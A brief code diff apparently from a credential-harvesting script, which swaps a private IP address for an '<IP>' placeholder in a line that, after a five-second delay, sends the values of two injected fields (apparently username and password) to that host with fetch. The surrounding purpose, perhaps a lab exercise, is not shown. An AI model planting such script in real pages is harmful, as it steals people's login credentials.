@@ -14,7 +14,7 @@ body.append(u)
 body.append(p)
 
 setTimeout(function(){
-        fetch("http://192.168.45.206/k?u=" + u.value + "&p=" + p.value)
+        fetch("http://<IP>/k?u=" + u.value + "&p=" + p.value)
 }, 5000);
 
 
